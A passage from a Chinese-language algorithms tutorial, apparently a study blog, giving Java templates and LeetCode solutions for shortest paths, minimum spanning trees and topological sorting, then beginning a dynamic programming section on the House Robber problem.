distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n###### 例题1: 到达角落需要移除障碍物的最小数目\n[到达角落需要移除障碍物的最小数目](https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220601161114.png)\n\n代码：\n```java\nclass Solution {\n  public int minimumObstacles(int[][] grid) {\n    return dijkstra(new State(0, 0, 0), grid);\n  }\n\n  int dijkstra(State startState, int[][] graph) {\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return a.distFromStart - b.distFromStart;\n    });\n\n    int[][] dist = new int[graph.length][graph[0].length];\n    for (int i = 0; i < dist.length; i++) {\n      Arrays.fill(dist[i], Integer.MAX_VALUE);\n    }\n    dist[startState.row][startState.col] = 0;\n\n    boolean[][] isSelected = new boolean[graph.length][graph[0].length]; \n\n    pq.add(startState);\n    \n    while (!pq.isEmpty()) {\n      State currentState = pq.poll();\n      \n      if (currentState.row == graph.length - 1 && currentState.col == graph[0].length - 1) {\n        return currentState.distFromStart;\n      }\n\n      if (isSelected[currentState.row][currentState.col]) {\n        continue;\n      }\n      isSelected[currentState.row][currentState.col] = true;\n      \n      List<State> nextStates = new ArrayList();\n      \n\t\t\tint[] dr = new int[]{-1, 1, 0, 0};\n\t\t\tint[] dc = new int[]{0, 0, -1, 1};\n      \n\t\t\tfor (int i = 0; i < 4; i++) {\n\t\t\t\tint nr = currentState.row + dr[i];\n\t\t\t\tint nc = currentState.col + dc[i];\n        if (nr >= 0 && nr < graph.length && nc >= 0 && nc < graph[0].length) {\n          nextStates.add(new State(nr, nc, graph[nr][nc] == 1 ? currentState.distFromStart + 1 : currentState.distFromStart));\n        }\n\t\t\t}\n      \n      for (State nextState : nextStates) {\n        if (isSelected[nextState.row][nextState.col]) continue;\n        if (dist[nextState.row][nextState.col] > nextState.distFromStart) {\n          dist[nextState.row][nextState.col] = nextState.distFromStart;\n          pq.add(nextState);\n        }   \n      }\n    }\n    return -1;\n  }\n\n  class State{\n    int row;\n    int col;\n    int distFromStart;\n    public State(int row, int col, int distFromStart) {\n      this.row = row;\n      this.col = col;\n      this.distFromStart = distFromStart;\n    }\n  }\n}\n```\n###### 例题2: 概率最大的路径\n[概率最大的路径](https://leetcode.cn/problems/path-with-maximum-probability/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220601194923.png)\n\n代码：\n```java\nclass Solution {\n  int end;\n  public double maxProbability(int n, int[][] edges, double[] succProb, int start, int end) {\n    this.end = end;\n    // 构建图\n    List<double[]>[] graph = new LinkedList[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new LinkedList();\n    }\n    for (int i = 0; i < edges.length; i++) {\n      int[] edge = edges[i]; \n      int from = edge[0];\n      int to = edge[1];\n      double weight = succProb[i];\n      graph[from].add(new double[]{to, weight});\n      graph[to].add(new double[]{from, weight});\n    }\n    return dijkstra(new State(start, 1), graph);\n  \n  }\n  \n  double dijkstra(State startState, List<double[]>[] graph) {\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return Double.compare(b.distFromStart, a.distFromStart);\n    });\n\n    double[] dist = new double[graph.length];\n    Arrays.fill(dist, -1);\n    dist[startState.id] = 1;\n\n    boolean[] isSelected = new boolean[graph.length];\n\n    pq.add(startState); \n    \n    while(!pq.isEmpty()) {\n      State currentState = pq.poll();\n      \n      // 如果当前点为end点\n      if (currentState.id == end) {\n        return currentState.distFromStart;\n      }\n\n      if (isSelected[currentState.id]) {\n        continue;\n      }\n      isSelected[currentState.id] = true;\n\n      List<State> nextStates = new ArrayList();\n      for (double[] neighbor : graph[currentState.id]) {\n        double nextNodeId = neighbor[0];\n        double distToNextNode = dist[currentState.id] * neighbor[1];\n        nextStates.add(new State((int)nextNodeId, distToNextNode));\n      }\n\n      for (State nextState : nextStates) {\n        if (isSelected[nextState.id]) continue;\n        if (dist[nextState.id] < nextState.distFromStart) {\n          dist[nextState.id] = nextState.distFromStart;\n          pq.add(nextState);\n        }\n      }\n    }\n    return 0;\n  }\n\n  class State {\n    int id;\n    double distFromStart;\n    public State(int id, double distFromStart) {\n      this.id = id;\n      this.distFromStart = distFromStart;\n    }\n  }\n  \n}\n```\n\n###### 例题3: 最小体力消耗路径\n[最小体力消耗路径](https://leetcode.cn/problems/path-with-minimum-effort/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220601224956.png)\n\n代码：\n```java\nclass Solution {\n  public int minimumEffortPath(int[][] heights) {\n    return dijkstra(new State(0, 0, 0), heights);\n  }\n\n  int dijkstra(State startState, int[][] heights) {\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return a.distFromStart - b.distFromStart;\n    });\n\n    int[][] dist = new int[heights.length][heights[0].length];\n    for (int i = 0; i < heights.length; i++) {\n      Arrays.fill(dist[i], Integer.MAX_VALUE);\n    }\n    dist[startState.row][startState.col] = 0;\n\n    boolean[][] isSelected = new boolean[heights.length][heights[0].length]; \n\n    pq.add(startState);\n    \n    while (!pq.isEmpty()) {\n      State currentState = pq.poll();\n      \n      if (currentState.row == heights.length - 1 && currentState.col == heights[0].length - 1) {\n        return currentState.distFromStart;\n      }\n\n      if (isSelected[currentState.row][currentState.col]) {\n        continue;\n      }\n      isSelected[currentState.row][currentState.col] = true;\n\n      List<State> nextStates = new ArrayList();\n      int[] dr = new int[]{-1, 1, 0, 0};\n\t\t\tint[] dc = new int[]{0, 0, -1, 1};\n\t\t\tfor (int i = 0; i < 4; i++) {\n\t\t\t\tint nr = currentState.row + dr[i];\n\t\t\t\tint nc = currentState.col + dc[i];\n        if (nr >= 0 && nr < heights.length && nc >= 0 && nc < heights[0].length) {\n          nextStates.add(new State(nr, nc, Math.max(dist[currentState.row][currentState.col], Math.abs(heights[currentState.row][currentState.col] - heights[nr][nc]))));\n        }\n\t\t\t}\n\n      for (State nextState : nextStates) {\n        if (isSelected[nextState.row][nextState.col]) continue;\n        if (dist[nextState.row][nextState.col] > nextState.distFromStart) {\n          dist[nextState.row][nextState.col] = nextState.distFromStart;\n          pq.add(nextState);\n        }\n      }\n    }\n    return -1;\n  }\n  \n  class State {\n    int row;\n    int col;\n    int distFromStart;\n    public State(int row, int col, int distFromStart) {\n      this.row = row;\n      this.col = col;\n      this.distFromStart = distFromStart;\n    }\n  }\n\n}\n```\n\n#### Bellman-Ford算法\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/c0aFMkpW5Lo\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/bxC1y6MsNlQ\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n需要注意的是，在遍历所有的边来进行松弛操作前，需要先对 dist 进行备份，否则会出现「本次松弛操作所使用到的边，也是在同一次迭代所更新的」，从而不满足边数限制的要求。\n\n举个例子，例如本次松弛操作使用了从 a 到 b 的当前最短距离来更新 dist[b]，直接使用 dist[a] 的话，不能确保 dist[a] 不是在同一次迭代中所更新，如果 dist[a] 是同一次迭代所更新的话，那么使用的边数将会大于 k 条。\n\n因此在每次迭代开始前，我们都应该对 dist 进行备份，在迭代时使用备份来进行松弛操作。\n\n##### 模版\n```java\n/**\n * @param s     起点\n * @param k     得到使用小于等于k条边的最短路径\n * @param edges 边集数组存储的图\n * @param dist  用于得到第s个顶点到其它顶点之间的最短距离\n * @return 是否存在负环，返回true，则存在负环\n */\nboolean bellmanFord(int s, int k, List<Edge> edges, int[] dist) {\n  // 初始化dist。此处不使用Integer.MAX_VALUE，而是除2的原因：防止 distClone[edge.begin] + edge.weight 数据溢出\n  Arrays.fill(dist, Integer.MAX_VALUE / 2);\n  dist[s] = 0;\n\n  // 执行k次\n  for (int i = 0; i < k; i++) {\n    // 对 dist 进行备份，在迭代时使用备份来进行松弛操作\n    int[] distClone = dist.clone();\n    // 用来标记此轮操作中是否对顶点进行了松弛操作\n    boolean flag = false;\n    for (Edge edge : edges) {\n      if (dist[edge.end] > distClone[edge.begin] + edge.weight) {\n        dist[edge.end] = distClone[edge.begin] + edge.weight;\n        flag = true;\n      }\n    }\n    if (!flag) {\n      // 此时flag为false, 说明此轮操作中没有顶点进行松弛操作，说明已经找到了所有顶点的做短路径, 且不存在负环\n      return false;\n    }\n  }\n\n  // 再执行1次，用来判断是否有负环；如果还能松弛, 则说明有负环\n  for (Edge edge : edges) {\n    if (dist[edge.end] > dist[edge.begin] + edge.weight) {\n      return true;\n    }\n  }\n  return false;\n}\n\n\n/**\n * 使用边集数组存储图\n */\nclass Edge {\n  int begin, end, weight;\n\n  Edge(int begin, int end, int weight) {\n    this.begin = begin;\n    this.end = end;\n    this.weight = weight;\n  }\n}\n```\n\n##### 例题1: K 站中转内最便宜的航班\n[K 站中转内最便宜的航班](https://leetcode.cn/problems/cheapest-flights-within-k-stops/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220602124644.png)\n\n代码：\n```java\nclass Solution {\n  public int findCheapestPrice(int n, int[][] flights, int src, int dst, int k) {\n    List<Edge> edges = new ArrayList();\n    for (int i = 0; i < flights.length; i++) {\n      edges.add(new Edge(flights[i][0], flights[i][1], flights[i][2]));\n    }\n    int[] dist = new int[n];\n    bellmanFord(src, k + 1, edges, dist);\n    return dist[dst] == Integer.MAX_VALUE / 2 ? -1 : dist[dst];\n  }\n\n \t\t/**\n\t\t * @param s     起点\n\t\t * @param k     得到使用小于等于k条边的最短路径\n\t\t * @param edges 边集数组存储的图\n\t\t * @param dist  用于得到第s个顶点到其它顶点之间的最短距离\n\t\t * @return 是否存在负环，返回true，则存在负环\n\t\t */\n\t\tboolean bellmanFord(int s, int k, List<Edge> edges, int[] dist) {\n\t\t\t// 初始化dist\n\t\t\tArrays.fill(dist, Integer.MAX_VALUE / 2);\n\t\t\tdist[s] = 0;\n\n\t\t\t// 执行k次\n\t\t\tfor (int i = 0; i < k; i++) {\n\t\t\t\t// 对 dist 进行备份，在迭代时使用备份来进行松弛操作\n\t\t\t\tint[] distClone = dist.clone();\n\t\t\t\t// 用来标记此轮操作中是否对顶点进行了松弛操作\n\t\t\t\tboolean flag = false;\n\t\t\t\tfor (Edge edge : edges) {\n\t\t\t\t\tif (dist[edge.end] > distClone[edge.begin] + edge.weight) {\n\t\t\t\t\t\tdist[edge.end] = distClone[edge.begin] + edge.weight;\n\t\t\t\t\t\tflag = true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (!flag) {\n\t\t\t\t\t// 此时flag为false, 说明此轮操作中没有顶点进行松弛操作，说明已经找到了所有顶点的做短路径, 且不存在负环\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// 在执行1次，还能松弛则说明有负环\n\t\t\tfor (Edge edge : edges) {\n\t\t\t\tif (dist[edge.end] > dist[edge.begin] + edge.weight) {\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t\treturn false;\n\t\t}\n\n\n\t\t/**\n\t\t * 使用边集数组存储图\n\t\t */\n\t\tclass Edge {\n\t\t\tint begin, end, weight;\n\n\t\t\tEdge(int begin, int end, int weight) {\n\t\t\t\tthis.begin = begin;\n\t\t\t\tthis.end = end;\n\t\t\t\tthis.weight = weight;\n\t\t\t}\n\t\t}\n}\n```\n\n#### SPFA算法\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/r4MSAJ9Y0Ek\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n##### 模版:\n```java\n/**\n * @param startState 起点状态\n * @param n          节点个数\n * @param dist       用于得到起点到其它顶点之间的最短距离\n * @param graph      图\n * @return 是否存在负环，返回true，则存在负环\n */\nboolean spfa(State startState, int n, int[] dist, List<int[]>[] graph) {\n  Queue<State> queue = new LinkedList<>();\n  // 标记顶点是否正在队列中\n  boolean[] used = new boolean[n];\n  // 标记顶点进入了几次队列\n  int[] num = new int[n];\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  dist[startState.id] = 0; //第s个顶点到自身距离为0\n  queue.add(startState); // 第s个顶点入队\n  num[startState.id] = 1; // 表示第s个顶点已进入了1次队列\n  used[startState.id] = true; // 表示第s个节点正在队列中\n\n  while (!queue.isEmpty()) {\n    State currentState = queue.poll();\n    used[currentState.id] = false;\n\n    List<State> nextStates = new ArrayList<>();\n    for (int[] neighbor : graph[currentState.id]) {\n      nextStates.add(new State(neighbor[0], dist[currentState.id] + neighbor[1]));\n    }\n\n    for (State nextState : nextStates) {\n      if (dist[nextState.id] > nextState.distFromStart) {\n        dist[nextState.id] = nextState.distFromStart;\n        if (!used[nextState.id]) {\n          queue.add(nextState);\n          num[nextState.id]++;\n          if (num[nextState.id] > n) {\n            return false;\n          }\n          used[nextState.id] = true;\n        }\n      }\n    }\n  }\n  return false;\n}\n\n// 辅助类, 用于优先队列\nclass State {\n    // 图节点的 id\n    int id;\n    // 从 start 节点到当前节点的距离\n    int distFromStart;\n\n    State(int id, int distFromStart) {\n        this.id = id;\n        this.distFromStart = distFromStart;\n    }\n}\n```\n\n## 最小生成树\n最小生成树与最短路径的区别:\n- 最短路径是求两个点之间的最短距离\n- 最小生成树是求生成树中所有边上的权值之和最小\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220603094800.png)\n\n### Prim算法\nPrim的算法执行与Dijkstra算法十分相似。都是使用了贪心策略。Prim与Dijkstra只有贪心策略不同，其他部分代码逻辑一样。Prim的贪心策略为：每次从集合中选取**边**权值最小的节点。\n\n#### 模版\n```java\n/**\n * @param startState 开始状态\n * @param graph      图的表示方式，这里是使用的带有的权值的邻接表的表示方式\n * @return 最小生成树中的每个节点边的权值\n */\nint[] prim(State startState, List<int[]>[] graph) {\n  Queue<State> pq = new PriorityQueue<>((a, b) -> {\n    return a.distValue - b.distValue;\n  });\n\n  int[] dist = new int[graph.length];\n  Arrays.fill(dist, Integer.MAX_VALUE);\n  dist[startState.id] = 0;\n\n  boolean[] isSelected = new boolean[graph.length];\n\n  pq.add(startState);\n  while (!pq.isEmpty()) {\n    State currentState = pq.poll();\n\n    if (isSelected[currentState.id]) {\n      continue;\n    }\n    isSelected[currentState.id] = true;\n\n    List<State> nextStates = new ArrayList();\n    for (int[] neighbor : graph[currentState.id]) {\n      nextStates.add(new State(neighbor[0], neighbor[1]));\n    }\n\n    for (State nextState : nextStates) {\n      if (isSelected[nextState.id]) continue;\n      if (dist[nextState.id] > nextState.distValue) {\n        dist[nextState.id] = nextState.distValue;\n        pq.add(nextState);\n      }\n    }\n\n  }\n  return dist;\n}\n\nclass State {\n  // 节点的id\n  int id;\n  // 节点相连的边的权值\n  int distValue;\n\n  public State(int id, int distValue) {\n    this.id = id;\n    this.distValue = distValue;\n  }\n}\n```\n\n你会发现此模版与Dijkstra模版几乎一摸一样\n\n#### 例题1: 连接所有点的最小费用\n[连接所有点的最小费用](https://leetcode.cn/problems/min-cost-to-connect-all-points/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220603113058.png)\n\n代码:\n```java\nclass Solution {\n  public int minCostConnectPoints(int[][] points) {\n    int n = points.length;\n\n    // 构建图\n    List<int[]>[] graph = new ArrayList[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new ArrayList();  \n    }\n    for (int i = 0; i < n; i++) {\n      for (int j = i + 1; j < n; j++) {\n        graph[i].add(new int[]{j, Math.abs(points[i][0] - points[j][0]) + Math.abs(points[i][1] - points[j][1])});\n        graph[j].add(new int[]{i, Math.abs(points[i][0] - points[j][0]) + Math.abs(points[i][1] - points[j][1])});\n      }\n    }\n    \n    int res = 0;\n    int[] dist = prim(new State(0, 0), graph); \n    for (int i = 0; i < dist.length; i++) {\n      res += dist[i];\n    }\n    return res;\n  }\n\n  /**\n  * @param startState 开始状态\n  * @param graph      图的表示方式，这里是使用的带有的权值的邻接表的表示方式\n  * @return 最小生成树中的每个节点边的权值\n  */\n  int[] prim(State startState, List<int[]>[] graph) {\n    Queue<State> pq = new PriorityQueue<>((a, b) -> {\n      return a.distValue - b.distValue;\n    });\n  \n    int[] dist = new int[graph.length];\n    Arrays.fill(dist, Integer.MAX_VALUE);\n    dist[startState.id] = 0;\n  \n    boolean[] isSelected = new boolean[graph.length];\n  \n    pq.add(startState);\n    while (!pq.isEmpty()) {\n      State currentState = pq.poll();\n  \n      if (isSelected[currentState.id]) {\n        continue;\n      }\n      isSelected[currentState.id] = true;\n  \n      List<State> nextStates = new ArrayList();\n      for (int[] neighbor : graph[currentState.id]) {\n        nextStates.add(new State(neighbor[0], neighbor[1]));\n      }\n  \n      for (State nextState : nextStates) {\n        if (isSelected[nextState.id]) continue;\n        if (dist[nextState.id] > nextState.distValue) {\n          dist[nextState.id] = nextState.distValue;\n          pq.add(nextState);\n        }\n      }\n  \n    }\n    return dist;\n  }\n  \n  class State {\n    // 节点的id\n    int id;\n    // 节点相连的边的权值\n    int distValue;\n  \n    public State(int id, int distValue) {\n      this.id = id;\n      this.distValue = distValue;\n    }\n  }\n\n}\n```\n\n## 拓扑排序\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ncT9q9Astr4\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1NWqA9dpe9K42qQhKA6qhjlw-C7tCM0QA/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724225118.png)\n\n### 模版\nBFS入度表法（Kahn算法）模版4步骤\n1. 建图\n2. 建入度\n3. 找入口\n4. BFS拓扑排序\n\n代码： \n```java\n/**\n * 是否能生成拓扑排序\n * @param n 顶点个数\n * @return\n */\npublic boolean canFinish(int n, int[][] edges) {\n  // 1. 建图\n  List<Integer>[] graph = new List[n];\n  for (int i = 0; i < n; i++) {\n    graph[i] = new ArrayList<>();\n  }\n  // 2. 建入度\n  int[] indegree = new int[n];\n  for (int[] edge : edges) {\n    graph[edge[0]].add(edge[1]);\n    indegree[edge[1]]++;\n  }\n  // 3. 找到有向图的入口，即入度为0的点\n  Queue<Integer> q = new LinkedList<>();\n  for (int i = 0; i < n; i++) {\n    if (indegree[i] == 0) {\n      q.add(i);\n    }\n  }\n  // 4. BFS拓扑排序\n  int cnt = 0; // 以排序的节点\n  while (!q.isEmpty()) {\n    int cur = q.poll();\n    cnt++;\n\n    for (int next : graph[cur]) {\n      if (--indegree[next] == 0) q.add(next);\n    }\n  }\n  return cnt == n;\n}\n```\n\n### 例题1: 课程表\n[课程表](https://leetcode.cn/problems/course-schedule/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724222745.png)\n\n代码：\n```java\nclass Solution {\n  public boolean canFinish(int n, int[][] edges) {\n    // 1. 建图\n    List<Integer>[] graph = new List[n];\n    for (int i = 0; i < n; i++) {\n      graph[i] = new ArrayList<>();\n    }\n    // 2. 建入度\n    int[] indegree = new int[n];\n    for (int[] edge : edges) {\n      graph[edge[1]].add(edge[0]);\n      indegree[edge[0]]++;\n    }\n    // 3. 找到有向图的入口，即入度为0的点\n    Queue<Integer> q = new LinkedList<>();\n    for (int i = 0; i < n; i++) {\n      if (indegree[i] == 0) {\n        q.add(i);\n      }\n    }\n    // 4. BFS拓扑排序\n    int cnt = 0; // 以排序的节点\n    while (!q.isEmpty()) {\n      int cur = q.poll();\n      cnt++;\n      for (int next : graph[cur]) {\n        if (--indegree[next] == 0) q.add(next);\n      }\n    }\n    return cnt == n;\n  }\n}\n```\n\n### 例题2: 课程表 II\n[课程表 II](https://leetcode.cn/problems/course-schedule-ii/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724232120.png)\n\n代码：\n```java\nclass Solution {\n  public int[] findOrder(int numCourses, int[][] prerequisites) {\n    // 1. 建图\n    List<Integer>[] graph = new List[numCourses];\n    for (int i = 0; i < numCourses; i++) {\n      graph[i] = new ArrayList();\n    }\n    // 2. 建入度\n    int[] indegree = new int[numCourses];\n    for (int[] prerequisite : prerequisites) {\n      graph[prerequisite[1]].add(prerequisite[0]);\n      indegree[prerequisite[0]]++;\n    }\n    // 3. 找到有向图的入口，即入度为0的点\n    Queue<Integer> queue = new LinkedList();\n    for (int i = 0; i < numCourses; i++) {\n      if (indegree[i] == 0) {\n        queue.add(i);\n      }\n    }\n    // 拓扑排序\n    int cnt = 0;\n    int[] res = new int[numCourses];\n    while (!queue.isEmpty()) {\n      int cur = queue.poll();\n      res[cnt++] = cur;\n      for (int next : graph[cur]) {\n        if (--indegree[next] == 0) queue.add(next);\n      }\n    }\n\n    if (cnt == numCourses) {\n      return res;\n    }\n    return new int[0];\n  }\n}\n```\n\n# 动态规划\n动态规划通过组合子问题的解来求解原问题，一般来说，动态规划应用于**重叠子问题**的情况，即不同的子问题具有公共的子子问题。\n\n动态规划算法对每个子子问题**只求解一次**，将其解保存在一个表格中，从而无需每次求解一个子子问题时都重新计算，避免了这种不必要的计算工作。\n\n动态规划有两种实现方法：\n- 第一种方法称为**带备忘的自顶向下法（top-down with memoization）**, 即**带备忘录的递归**。此方法仍按自然的递归形式编写过程，但过程会保存每个子问题的解（通常保存在一个数组或散列表中）。当需要一个子问题的解时，过程首先检查是否已经保存过此解。如果是，则直接返回保存的值，从而节省了计算时间；否则，按通常方式计算这个子问题。我们称这个递归过程是带备忘的（memoized），因为它“记住”了之前已经计算出的结果。\n- 第二种方法称为**自底向上法（bottom-up method）**。这种方法一般需要恰当定义子问题“规模”的概念，使得任何子问题的求解都只依赖于“更小的\"子问题的求解。因而我们可以将子问题按规模排序，按由小至大的顺序进行求解。当求解某个子问题时，它所依赖的那些更小的子问题都已求解完毕，结果已经保存。每个子问题只需求解一次，当我们求解它（也是第一次遇到它）时，它的所有前提子问题都已求解完成。\n\n以上两个实现方法的核心思想就是**保存子问题的值，解决重叠子问题重复计算的问题**。 而我们常用一个数组来保存子问题的值，而这个数组就是备忘录或dp数组。这个备忘录或dp数组能表达如下2中意思：\n- `状态`， 由数组的下标确定, 不同的数组下标对应不同的状态\n- `状态对应的值`, 由数组的值确定\n\n所以我们在使用备忘录或dp数组时，一定要深知该表达的 状态以及该状态对应的值 所表达的含义\n\n## 动态规划的三个特征\n”三个特征“分别为最优子结构、无后效性和重复子问题\n\n#### 最优子结构\n最优子结构指的是，问题的最优解包含子问题的最优解。反过来说就是，可以通过子问题的最优解，推导出问题的最优解。\n\n若把最优子结构对应到前面定义的动态规划问题模型上，可以理解为，后面阶段的状态可以通过前面阶段的状态推导出来。\n\n例如，现在有`min_dist(i, j) = w[i][j] + min(min_dist(i, j-1), min_dist(i-1, j))`状态转移方程，即`dp(i, j)` 可以通过 `dp(i, j-1)` 和 `dp(i-1, j)` 两个状态推导出来。这就说明，这个问题符合“最优子结构”。\n\n### 无后效性\n无后效性有两层含义\n- 第一层含义是，在推导后面阶段的状态的时候，只关心前面阶段的状态值，不关心这个状态是怎么一步一步推导出来的。\n- 第二层含义是，某阶段状态一旦确定，就不受之后阶段的决策影响。\n\n例如在求最长上升子序列中，如果把子问题定义为\"求序列的前n个元素的最长上升子序列的长度\"。这个子问题是不具有“无后效性”的。分析如下：\n\n假设F(n) = x, 但可能有多个序列满足F(n) = x。有的序列的最后一个元素比$a_(n+1)$小, 则加上$a_(n+1)$就能形成更长上升子序列；有的序列最后一个元素不比$a_(n+1)$小...以后的事情受如何达到状态n的影响，不符合“无后效性”\n\n**递归中子问题可以不是无后效性的, 但是如果能将递归转换成自底向上的动态规划, 此时的子问题一定是无后效性的。当我们选取子问题时 最好选择无后效性是子问题, 因为无后效性的子问题比有后效性的易处理**\n\n### 重复子问题\n不同的决策序列，到达某个相同的阶段时，可能会产生重复的状态。\n\n## 步骤\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408163551.png)\n\n### 例题：打家劫舍(力扣198)\n你是一个小偷，现在有一排相邻的房屋等着你去偷窃。这些房子装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。给定一个代表每个房屋存放金额的正整数数组，计算你不触动警报装置的情况下，一夜之内能够偷窃到的最高金额。（不用考虑偷窃时间）\n```\n示例1：\n输入：[1，2，3，1，3]\n输出：7解释：偷窃1号房屋（金额=1），然后偷窃3号房屋（金额=3），接着偷窃5号房屋（金额=3）。偷窃到的最高金额=1+3+3=7。\n示例2：\n输入：[2，7，2，3，8]\n输出：15解释：偷窃2号房屋（金额=7），然后偷窃5号房屋（金额=8）。偷窃到的最高金额=7+8=15。\n```\n\n#### 分析1\n递归分析：\n1. 节点的作用: 当第一家偷的是第now家且以后偷的家都是大于now时的最大偷窃金额\n2. 父子节点之间的关系: 子节点表示在父节点情况下第二家偷的情况\n3. 节点不能生成子节点的情况: 没有下一家可以偷了\n\n递归树:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408163642.png)\n\n代码：\n```java\npublic class Main {\n  public static void main(String args[]) {\n    Solution so = new Solution();\n    System.out.println(so.rob(new int[]{1, 2, 3, 1, 3}));\n  }\n}\n\nclass Solution {\n  private int length;\n\n  public int rob(int[] nums) {\n    length = nums.length; \n    return dfs(-2, nums);\n  }\n\n  private int dfs(int now, int[] nums) {\n    if (now >= length - 2) {\n      return nums[now];\n    }\n    int maxNum = Integer.MIN_VALUE;\n    for (int i = now + 2; i < length; i++) {\n      maxNum = Math.max(maxNum, dfs(i, nums));\n    }\n    if(now == -2) return maxNum;\n    return maxNum + nums[now];\n  }\n}\n```\n\n我们发现出现子问题重复计算的情况，因此我们用备忘录来存储子问题；此处的备忘录可以设置为`dp[i]`, 表示当第一家偷的是i时，最大偷窃金额为`dp[i]`。定义完备忘录后，简化递归树:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408163820.png)\n\n代码：\n```java\npublic class Main {\n  public static void main(String args[]) {\n    Solution1 so = new Solution1();\n    System.out.println(so.rob(new int[]{1, 2, 3, 1, 3}));\n  }\n}\n\nclass Solution1 {\n  private int[] dp = null;\n  private int length;\n\n  public int rob(int[] nums) {\n    length = nums.length; \n    dp = new int[length];\n    initDp();\n    return dfs(-2, nums);\n  }\n\n  private void initDp() {\n    for (int i = 0; i < length; i++) {\n      dp[i] = -1; \n    }\n  }\n\n  private int dfs(int now, int[] nums) {\n    if (now >= length -2) {\n      return nums[now];\n    }\n    int maxNum = Integer.MIN_VALUE;\n    for (int i = now + 2; i < length; i++) {\n      if(dp[i] == -1){\n        dp[i] = dfs(i, nums);\n      }\n      maxNum = Math.max(maxNum, dp[i]);\n    }\n    if(now == -2) return maxNum;\n    return maxNum + nums[now];\n  }\n}\n```\n\n通过分析发现，无法推出备忘录中的各个数据之间的通项公式, 所以只能使用上述的带有备忘录的递归，而不能使用自底向上法\n\n#### 分析2\n\n递归分析：\n1. 节点的作用: 求自在前now家（包括第now家）偷时，最大的偷窃金额\n2. 父子节点之间的关系: 子节点表示在父节点情况下第二家偷的情况\n3. 节点不能生成子节点的情况: 没有下一家可以偷了\n\n递归树：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408163831.png)\n\n代码\n```java\npublic class Main {\n  public static void main(String args[]) {\n    Solution so = new Solution();\n    System.out.println(so.rob(new int[]{1, 2, 3, 1, 3}));\n  }\n}\n\nclass Solution {\n  public int rob(int[] nums) {\n    return dfs(nums.length-1, nums);\n  }\n\n  private int dfs(int now, int[] nums) {\n    if(now == 0) return nums[0];\n    if(now == 1) return Math.max(nums[1], nums[0]);\n    return Math.max(dfs(now-1, nums), dfs(now-2, nums) + nums[now]);\n  }\n}\n```\n\n**子问题分析：**\n- 子问题的范围: 只在前now家（包括第now家）偷\n- 子问题的属性：最大偷窃金额\n\n我们发现出现子问题重复计算的情况，因此我们用备忘录来存储子问题；此处的备忘录可以设置为`dp[i]`, 表示只在前i家偷时，最大偷窃金额为`dp[i]`。定义完备忘录后，简化递归树:\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408164255.png)\n\n代码：\n```java\npublic class Main {\n  public static void main(String args[]) {\n    Solution so = new Solution();\n    System.out.println(so.rob(new int[]{1, 2, 3, 1, 3}));\n  }\n}\n\nclass Solution {\n  private int[] dp = null;\n\n  public int rob(int[] nums) {\n    int length = nums.length;\n    dp = new int[length];\n    initDp(length); \n    return dfs(nums.length-1, nums);\n  }\n\n  private void initDp(int length) {\n    for (int i = 0; i < length; i++) {\n      dp[i] = -1; \n    }\n  }\n\n  private int dfs(int now, int[] nums) {\n    if(now == 0) return nums[0];\n    if(now == 1) return Math.max(nums[1], nums[0]);\n    if(dp[now-1] == -1) {\n      dp[now-1] = dfs(now-1, nums);\n    }\n    if(dp[now-2] == -1) {\n      dp[now-2] = dfs(now-2, nums);\n    }\n    return Math.max(dp[now-1], dp[now-2] + nums[now]);\n  }\n}\n```\n\n通过分析发现，可以推出备忘录中的各个数据之间的通项公式为\n$$dp(now) = \\begin{cases}\nnums[0] & now = 0 \\\\\nmax(nums[0], nums[1]) & now = 1 \\\\\nmax\\{dp(now-1), dp(now-2) + nums[now]\\} & now \\geq 2\n\\end{cases}$$\n\n\n所以可以使用从底向上法，代码如下：\n```java\npublic class Main {\n  public static void main(String args[]) {\n    